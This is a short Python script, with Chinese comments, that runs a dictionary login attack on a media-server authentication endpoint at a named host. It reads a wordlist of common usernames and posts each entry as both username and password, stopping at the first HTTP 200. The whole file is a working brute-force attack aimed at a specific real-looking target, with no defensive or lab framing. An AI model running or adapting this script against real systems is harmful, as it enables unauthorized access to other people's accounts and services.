import asyncio
import time

import aiohttp

async def send_post_request():
    url = "https://video.bystart.icu/Users/authenticatebyname"  # Replace with your URL
    result = get_data_from_file('C:\\Users\\bowang28\\Desktop\\测试\\字典\\Blasting_dictionary-master\\常用用户名.txt')
    for iteam in result:
        time.sleep(0.00001)
        payload = {
            "Username": iteam,
            "Pw": iteam
        }
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload) as response:
                if response.status == 200:
                    print("Success:", await response.text())
                    break
                else:
                    print("Failed:", response.status, "Failed User: ", iteam)

def get_data_from_file(path):
    # 定义一个空集合
    data_set = set()

    # 打开文件（假设文件名为 'example.txt'）
    with open(path, 'r', encoding='utf-8') as file:
        # 逐行读取文件内容
        for line in file:
            # 去除每行的换行符，并将内容加入集合中
            data_set.add(line.strip())
    return data_set

# To run the async function
asyncio.run(send_post_request())
